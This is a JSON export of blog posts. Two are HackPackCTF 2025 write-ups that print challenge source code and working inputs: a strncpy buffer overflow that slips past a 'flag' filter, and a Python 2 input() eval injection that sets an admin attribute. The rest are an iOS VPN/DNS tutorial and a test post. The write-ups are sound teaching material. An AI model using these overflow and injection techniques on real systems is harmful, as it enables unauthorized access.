[ { "title": "HackPackCTF 2025: FileForest", "url": "/posts/HackPackCTF-FileForest/", "categories": "CTF", "tags": "HackPackCTF", "date": "2025-05-07 04:00:00 -0400", "content": " Category: PWN Difficulty: Easy Points: 500 FileForest begins by using netcat to access a remote environment. You can explore this environment using ls, cd, and cat. You should quickly discover flag.txt, amongst some other text files, using some of the programs built into the environment. You won’t be able to access the directory where the raw file is stored, but you can read the other files there using the fileforest binary which is accessible. The catch: there is some mechanism in fileforest which intercepts “flag” and throws an invalid argument error. Let’s investigate! Further exploration should reveals the source code of the fileforest binary, included below: #include &lt;assert.h&gt; #include &lt;dirent.h&gt; #include &lt;fcntl.h&gt; #include &lt;limits.h&gt; #include &lt;linux/openat2.h&gt; #include &lt;signal.h&gt; #include &lt;stdbool.h&gt; #include &lt;stdint.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;unistd.h&gt; static char const* state_directory = \"/var/lib/fileforest\"; #define FOREST_READ_BUFFER_SIZE 4096 // Wrapper for the openat2(2) system call. static int do_openat2(int dirfd, char const* path, struct open_how how) { long result = syscall(SYS_openat2, dirfd, path, &amp;how, sizeof(how)); if (result &lt; 0) return -1; if (result &gt; INT_MAX) { fprintf(stderr, \"Invalid result from openat2: %ld\\n\", result); exit(1); } return (int) result; } // Opens the directory path within the directory referred to by file // descriptor base_fd. Ensure that name lookup never proceeds outside // base_fd. static int open_beneath(int base_fd, char const* path, uint64_t flags) { return do_openat2(base_fd, path, (struct open_how) { .flags = flags, .resolve = RESOLVE_BENEATH | RESOLVE_NO_MAGICLINKS, }); } typedef struct forest_state { int working_dir; } forest_state; // Safely opens a path within state-&gt;working_dir. static int forest_open(forest_state const* state, char const* path, uint64_t flags) { return open_beneath(state-&gt;working_dir, path, flags); } static void do_read(forest_state const* state, char const* arg) { if (arg == NULL) { printf(\"A path is required.\\n\"); return; } int file = forest_open(state, arg, O_RDONLY); if (file &lt; 0) { printf(\"Could not open file: %s\\n\", arg); return; } bool ends_newline = false; while (1) { char data[FOREST_READ_BUFFER_SIZE] = {0}; ssize_t const read_bytes = read(file, data, sizeof(data)); if (read_bytes &lt; 0) { printf(\"Could not read file: %s\\n\", arg); close(file); return; } if (read_bytes == 0) { break; } fwrite(data, 1, read_bytes, stdout); // Safety: read_bytes &gt; 0. ends_newline = data[read_bytes - 1] == '\\n'; } // Ensure we end the file with a newline, but don't print a double newline. if (!ends_newline) { putc('\\n', stdout); } close(file); } static int cmp_file_names(void const* pa, void const* pb) { char const* a = *(char const**) pa; char const* b = *(char const**) pb; bool a_is_dir = strchr(a, '.') == NULL; bool b_is_dir = strchr(b, '.') == NULL; // Sort directory names first. if (a_is_dir &amp;&amp; !b_is_dir) return -1; if (!a_is_dir &amp;&amp; b_is_dir) return 1; return strcmp(a, b); } static void do_list_files(DIR* dir) { // We do not handle the case of growing. There will be no directories with // more than 512 entries. const size_t names_capacity = 512; size_t files_size = 0; char** const files = calloc(names_capacity, sizeof(*files)); if (files == NULL) { printf(\"Could not list names.\\n\"); // There is no cleanup to do. return; } struct dirent* de; // directory entry pointer while ((de = readdir(dir)) != NULL) { if (files_size == names_capacity) { printf(\"Could not list names.\\n\"); goto cleanup; } assert(files_size &lt; names_capacity); char const* name = de-&gt;d_name; // Don't show empty or hidden entries. // SAFETY: name is a null-terminated string, so reading the first byte is // always okay. if (name[0] == '\\0' || name[0] == '.') { continue; } char* copy = strdup(name); if (copy == NULL) { printf(\"Could not list names.\\n\"); goto cleanup; } // Show the file if its name does not contain a \".\" (assumed to be a directory), or // if the file contains \".txt\". if (strstr(copy, \".\") == NULL || strstr(copy, \".txt\") != NULL) { // Only list .txt files files[files_size] = copy; ++files_size; } } qsort(files, files_size, sizeof(*files), cmp_file_names); for (size_t i = 0; i &lt; files_size; ++i) { printf(\"%s\\n\", files[i]); } cleanup: for (size_t i = 0; i &lt; files_size; ++i) { free(files[i]); } free(files); } static void do_ls(forest_state const* state, char const* path) { if (path == NULL) { path = \".\"; } int const target_fd = forest_open(state, path, O_RDONLY | O_DIRECTORY); if (target_fd &lt; 0) { printf(\"Could not list files.\\n\"); return; } DIR* dr = fdopendir(target_fd); if (dr == NULL) { printf(\"Could not open current directory.\\n\"); close(target_fd); return; } do_list_files(dr); closedir(dr); } static void do_summarize(forest_state const* state, char const* path) { if (path == NULL) { printf(\"A path is required.\\n\"); return; } int file = forest_open(state, path, O_RDONLY); if (file &lt; 0) { printf(\"Could not open file: %s\\n\", path); return; } size_t file_length = 0; size_t newline_count = 0; while (1) { char data[FOREST_READ_BUFFER_SIZE] = {0}; ssize_t const read_bytes = read(file, data, sizeof(data)); if (read_bytes &lt; 0) { printf(\"Could not read file: %s\\n\", path); close(file); return; } if (read_bytes == 0) { break; } file_length += read_bytes; for (size_t i = 0; i &lt; (size_t) read_bytes; ++i) { if (data[i] == '\\n') { ++newline_count; } } } printf(\"File has %zd bytes and %zd newlines.\\n\", file_length, newline_count); } static void do_help(void) { printf(\"%-30s %s\\n\", \"help\", \"Lists FileForest's functions and their uses\"); printf(\"%-30s %s\\n\", \"ls\", \"Lists the text files in the current directory\"); printf(\"%-30s %s\\n\", \"ls [dirname]\", \"Lists the text files in the directory with the given name\"); printf(\"%-30s %s\\n\", \"q\", \"Quits the program\"); printf(\"%-30s %s\\n\", \"read [filename]\", \"Reads the file with the given name\"); printf(\"%-30s %s\\n\", \"summarize [filename]\", \"Gives the number of bytes and lines in the specified file\"); } int main(void) { // Ensure that written output is written promptly (useful for testing over // SSH). setvbuf(stdout, NULL, _IOLBF, BUFSIZ); printf(\"Welcome to FileForest!\\n\"); forest_state state = { .working_dir = open(state_directory, O_RDONLY | O_DIRECTORY), }; if (state.working_dir &lt; 0) { fprintf(stderr, \"Failed to open state directory: %s\\n\", state_directory); exit(1); } char command_line[512] = {0}; char command_arg[512 - 16] = {0}; char command_name[16] = {0}; while (1) { // Fully zero inputs. Our strncpy's below will rely on this. memset(command_line, 0, sizeof(command_line)); memset(command_arg, 0, sizeof(command_arg)); memset(command_name, 0, sizeof(command_name)); printf(\"Command: \"); fflush(stdout); if (fgets(command_line, sizeof(command_line), stdin) == NULL) { return 0; } // Put \"Command: \" on its own line if we are not reading from a terminal. // (If we are reading from a terminal, then the user presses enter, which // will display the newline.) if (!isatty(STDIN_FILENO)) { printf(\"\\n\"); } size_t command_len = strlen(command_line); if (command_len == 0) { continue; } // If we read a newline at the end of the command, ignore it. // SAFETY: command_len != 0. if (command_line[command_len - 1] == '\\n') { command_line[command_len - 1] = '\\0'; } char* arg_start = strchr(command_line, ' '); bool has_arg = false; if (arg_start != NULL) { // Add 1 to arg_start to move past space character. // Subtract 1 from length to ensure final NUL is not overwritten. strncpy(command_arg, arg_start + 1, sizeof(command_arg) - 1); has_arg = true; } if (strstr(command_arg, \"flag\") != NULL) { printf(\"Invalid argument: %s\\n\", command_arg); continue; } // If we have an argument, only copy until before the space. // Otherwise, copy the entire command line. Subtract one from size to ensure // we don't overwrite the final NUL. strncpy(command_name, command_line, arg_start ? (arg_start - command_line) : (sizeof(command_name) - 1)); char const* const effective_arg = has_arg ? command_arg : NULL; // We know the length of the string literal, so pass it as an optimization // rather than using strcmp. if (strncmp(command_name, \"q\", 1) == 0) { printf(\"Goodbye.\\n\"); break; } else if (strncmp(command_name, \"read\", 4) == 0) { do_read(&amp;state, effective_arg); } else if (strncmp(command_name, \"ls\", 2) == 0) { do_ls(&amp;state, effective_arg); } else if (strncmp(command_name, \"summarize\", 9) == 0) { do_summarize(&amp;state, effective_arg); } else if (strncmp(command_name, \"help\", 4) == 0) { do_help(); } else { printf(\"Unknown command: %s\\n\", command_name); printf(\"Use help to see the list of valid commands\\n\"); } } } Clues We can search for places where the “flag” string is giving us grief, and we find this if statement: if (strstr(command_arg, \"flag\") != NULL) { \tprintf(\"Invalid argument: %s\\n\", command_arg); \tcontinue; } So, what can we learn about command_arg? Well for starters, it’s declared right near a bunch of other memory variables: char command_line[512] = {0}; char command_arg[512 - 16] = {0}; char command_name[16] = {0}; If you know about buffer overflows, we have a promising target. So how does the value in these variables get loaded? Well, just below, you can see they get zeroed out, but the comments confirm that this should be our target: // Fully zero inputs. Our strncpy's below will rely on this. memset(command_line, 0, sizeof(command_line)); memset(command_arg, 0, sizeof(command_arg)); memset(command_name, 0, sizeof(command_name)); While not as bad as strcpy, strncpy can still give us lots of options. In the case of this program, strncpy is used with a dynamic value of n, and even worse, it’s a value we can control since it’s the length of command_name: strncpy(command_name, command_line, arg_start ? (arg_start - command_line) : (sizeof(command_name) - 1)); The above of code is vulnerable to a buffer overflow. Based on the where the memory was declared earlier, we can predict that if command_name is longer than 16 characters, the extra characters will begin to overwrite command_arg. This happens after command_arg is inspected for the “flag” string, so this could allow us to rewrite the file name after the check. Because the program outputs the name of a file if it doesn’t find it, we can test what the runtime file name is: int file = forest_open(state, path, O_RDONLY); if (file &lt; 0) { printf(\"Could not open file: %s\\n\", path); return; } So let’s test if we can add something to the command name and have things work as expected: read doesnotexist.txt Could not open file: doesnotexist.txt read0 doesnotexist.txt Could not open file: doesnotexist.txt read00000 doesnotexist.txt Could not open file: doesnotexist.txt This confirms that the command name, read is still parsed correctly even if we add something to it. Now we can increment the extension until something breaks. We should expect something between ten and twenty extra characters, based on the size of the read000000000000000 doesnotexist.txt Could not open file: 000snotexist.txt Bingo! We have confirmed that a buffer overflow is possible. Now, since the string “flag” is four characters long, let’s shorten the file name to 4 characters and try to overflow the buffer. Since we got three characters to overwrite the file name in our previous try, let’s replace the last three zero’s with “fla” and add a “g”. read000000000000flag summ.txt hackpackCTF{...} Victory! Solution Use the fileforest binary’s read command with an input that overflows the buffer so that you bypass the “flag” check but still execute read flag.txt. read000000000000flag summ.txt hackpackCTF{...} " }, { "title": "HackPackCTF 2025: WeAreGreenLLC", "url": "/posts/HackPackCTF-WeAreGreenLLC/", "categories": "CTF", "tags": "HackPackCTF", "date": "2025-05-01 04:00:00 -0400", "content": " Category: PWN Difficulty: Easy Points: 500 Below is the full source code provided for the challenge: from os import getenv import re from sys import stdout import __builtin__ import inspect SECRET = getenv('SECRET', 'SECRET{THIS_IS_NOT_A_FLAG}') # Step 2: Disable all imports def blocked_import(name, *args, **kwargs): raise ImportError(\"All imports are disabled.\") __builtin__.__import__ = blocked_import # Step 3: Disable all dangerous functions __builtin__.__dict__['execFile'] = None __builtin__.__dict__['compile'] = None __builtin__.__dict__['exec'] = None __builtin__.__dict__['eval'] = None __builtin__.__dict__['open'] = None __builtin__.__dict__['reload'] = None class User: def __init__(self, name): self.name = name def secured_attribute_update(self, key, value, secret): if not isinstance(secret, str): raise TypeError(\"Only string literals are allowed!\") # Inspect the caller's frame for global variables caller_globals = inspect.currentframe().f_back.f_globals # Check if the argument references any global object (like a dict) for var_name, var_value in caller_globals.items(): if id(secret) == id(var_value): # Compare object identities raise ValueError(\"Global variables are not allowed as arguments!\") if secret != SECRET: print(\"Woah! Wrong secret! You are not allowed to do that!\") stdout.flush() return setattr(self, key, value) print(\"Existing attribute updated successfully!\") stdout.flush() def __repr__(self): return \"User: \" + self.name def main(): user = User(\"Player\") print(\"Welcome,\", user) while True: try: print(\"Do you want the flag? (y/n)\") stdout.flush() user_input = raw_input() if user_input == \"y\": print(\"You need the secret to get the flag! What's the secret? \") stdout.flush() secret = input() if secret == SECRET: print(\"Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) \") stdout.flush() is_admin = raw_input() if is_admin == \"y\": if user.is_admin == True: match = re.search(r'SECRET{(.*?)}', SECRET) if match: flag_key = match.group(1) print(getenv(flag_key)) stdout.flush() else: print(\"You are not allowed to do that!\") stdout.flush() else: print(\"You Liar! You are not an admin! Try again!\") stdout.flush() else: print(\"I will allow you to try until you become an admin!\") stdout.flush() else: print(\"Oops! Wrong secret! Try again!\") stdout.flush() else: print(str.format(\"{user.name} said: \" + user_input + \" - Means, you don't want the flag! No worries, you can try again!\", user=user)) stdout.flush() except Exception as e: print(\"You are not allowed to do that!\") stdout.flush() if __name__ == \"__main__\": main() Clues Obviously we should work through the various prompts and checks to reach a state where the program will simply give us the flag. How could we manipulate secret? Notice the distinction between raw_input() and input(). In python 2, input() results are evaluated as code, and the presence of __builtin__ instead of builtin tells us this is python 2. We’ll know we succeeded if we get the “oops” message printed out: Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) Alright, so we can manipulate secret. The next check is whether user.is_admin is True. Here, a clue lies above. in secured_attribute_update(), setattr() is used to change a local attribute. Could this work for us? According to Python Documentation, setattr(x, ‘foobar’, 123) is equivalent to x.foobar = 123 Let’s try it: You need the secret to get the flag! What's the secret? setattr(user, 'is_admin', True) Oops! Wrong secret! Try again! Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y hackpackCTF{...} Bingo! Solution Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y You are not allowed to do that! Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? setattr(user, 'is_admin', True) Oops! Wrong secret! Try again! Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y hackpackCTF{...} Which we can shorten to: Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? setattr(user, 'is_admin', True) or SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y hackpackCTF{...} " }, { "title": "VPN with Custom DNS on iOS Using Passepartout", "url": "/posts/VPN-with-Custom-DNS-on-iOS-Using-Passepartout/", "categories": "Privacy", "tags": "VPN, DNS, iOS", "date": "2025-04-24 04:00:00 -0400", "content": "iOS has excellent support for VPNs and custom DNS servers, but what about both at the same time? This article explains reasons to use a VPN and custom DNS, as well as the solution to use both on iOS via an app called Passepartout. Why to use a VPN VPNs (Virtual Private Networks) are a foundational tool in any privacy and security arsenal. VPNs have three primary utilities: Hiding traffic from intermediary third-parties Hiding your true IP from the sites you visit and apps you use Connecting private networks without exposing between traffic VPNs work by negotiation a connection between two computers, typically your laptop/smartphone and a VPN server, then routing all traffic through that connection in an unreadable way. This means that your internet service provider or work wi-fi cannot see what websites you’re visiting. Additionally, it means the websites you’re visiting don’t know what network you’re actually connecting from; they only see the VPN address. Let’s consider a scenario. Say you access your email without using a VPN, and your internet address is 1.2.3.4. If you’re the only one who uses 1.2.3.4, then your email can include that information in a profile about you, and sell that at their discretion. Then, a month later, you visit DivorceLawyers.com using the same address, 1.2.3.4. See the trouble? Additionally, my internet provider can see what websites I visit, and they would know I visited DivorceLawyers.com, and they can sell that information at their discretion. What if we used a VPN instead? I access my email, and the internet address is a random address from a huge pool of addresses the VPN server can use. Maybe 5.6.7.8 one day, maybe 9.10.11.12 another day, etc. Now, if I visit DivorceLawyers.com, my internet address of 56.12.48.192 could be any user of the same VPN service, of which there could be tens or hundreds of thousands of people. Additionally, because my traffic is unreadable until it gets to the VPN server, my internet provider only sees random garbled Klingon nonsense, instead of seeing DivorceLawyers.com. VPNs are not a magic bullet in the privacy world. Advertisers and data brokers are always inventing clever new ways to watch you online. That said, a VPN is an important piece in the grand privacy puzzle. Why to use Custom DNS DNS (Domain Name System) is a core part of how the internet works. When you type in DivorceLawyers.com, how does your computer know where to go? The answer is DNS. The DNS system allows computers to look up the corresponding internet addresses when given a domain name, like wtthomas.org, divorcelawyers.com, or google.com. The owner of the domain can specify what internet address should be used, and can change it as needed. This means us humans don’t have to memorize crazy numbers like 14.12.58.124, we can just memorize amazon.com. Most computers use the default DNS specified by their network router, usually Google, Microsoft, Cloudflare, or some other huge tech company. But we have other options, and privacy enthusiasts can obtain major benefits from using custom DNS services that give us control over how this system works on our computers. For all the same reasons that Amazon or Google use DNS, trackers and advertisers also rely on the DNS system to keep their systems functioning. For example, when you load a webpage that uses Google Analytics to track you, your computer will query googleanalytics.com to get the internet address so it knows where to send the tracking information. So… what if it never got a response? What if your computer did not receive the internet address for googleanalystics.com? It would have no idea where to send the tracking information, and thus, the attempt to watch you online is foiled. However, this has been possible for a long time using popular browser extensions that stop the trackers from loading. What makes custom DNS special is that it doesn’t just apply to your browser, it applies to your entire computer, or even your entire network. Custom DNS can even be used as an effective parental control to stop entire apps from working, even if the DNS isn’t configured on a specific computer. The Challenge on iOS Given all the discussion above, privacy enthusiasts should be excited to load custom DNS and a VPN on their mobile devices. Most Android smartphones make this easy, but Apple mobile devices present some obstacles. Let’s take ProtonVPN and NextDNS, both highly popular services in their categories, for this example. If I install the NextDNS configuration profile using their installation instructions, everything works great! Additionally, if I install the ProtonVPN iOS app, it also works great. However, when I activate my VPN, I drop out of my custom DNS configuration. Why? Most VPNs override your default DNS settings. For all the reasons I covered, DNS can be used to track what websites you’re visiting. If you’re using a VPN, but you’re also using Google DNS, then Google can still see what websites you’re visiting based on your DNS queries, even if the traffic is unreadable. So, VPNs overwrite this to use their own DNS servers to prevent tracking. This is great by default, but we don’t have any control or visibility into those DNS servers. While some apps like ProtonVPN offer tracking blockers via their DNS, there’s no control or granularity, just a On/Off toggle. If I need to temporarily turn off my “tracking protection” to make a site load, I have to turn all of my DNS protection off, not just whitelist the needed domain. Enter Passepartout After much testing and head-scratching, I found Passepartout about two years ago. After a rock-solid two years, I am comfortable recommending Passerpartout as the solution to the problem of custom DNS and VPNs on iOS. Below is a tutorial on how to set up Passepartout using ProtonVPN and NextDNS. In the top right hand corner, tap the plus sign and choose &gt;Provider&gt;ProtonVPN&gt;OpenVPN. Next, tap Add module and click DNS Then, tap on the newly added DNS module to change the settings. Change Protocol to Over HTTPS and add the URL provided by NextDNS. Change Route through VPN to Yes. Tap Add address under SERVERS and add the two internet addresses provided by NextDNS. If you want to report the device name, you can optionally add a forward slash and a name to the URL. The above steps should be universal regardless of VPN provider. The steps below show the remaining configuration required to use OpenVPN via ProtonVPN. The steps below will be different depending whether your VPN provider allows outside-the-app VPN connections and how they choose to supply the credentials. Navigate to https://account.protonvpn.com/account-password#openvpn, or log in to ProtonVPN in your browser and find the Account menu in the top-left corner. Scroll down until you find the OpenVPN / IKEv2 username. This is the username/password that you will use for Passepartout. This is also where you will reset those credentials if you suspect they’ve been compromised (or on a regular basis if you want better security hygiene). There are some additional configurations I recommend, such as excluding mobile data from the VPN connection to save data, but I’ll leave you to test your setup and make quality-of-life changes as you see fit. Make sure you have the normal NextDNS configuration profile installed if you create exceptions for the VPN. If your VPN fails or intentionally disconnects, iOS will fall back to this profile and keep your DNS filtered like normal. " }, { "title": "Welcome", "url": "/posts/Welcome/", "categories": "", "tags": "", "date": "2025-04-19 04:00:00 -0400", "content": "Welcome to my blog! This is a test post. Posts should have full markdown capability, with excellent display characteristics for code blocks and alerts/prompts. Here’s some code: for(int i = 0; i &lt; 5; i++) { System.out.println(\"Hello world.\"); } Here’s some prompts: You can do tip level. You can do info level. You can do warning level. You can do danger level. There’s also support for images, videos, tables, and basically anything else Markdown supports. Onward! " } ]
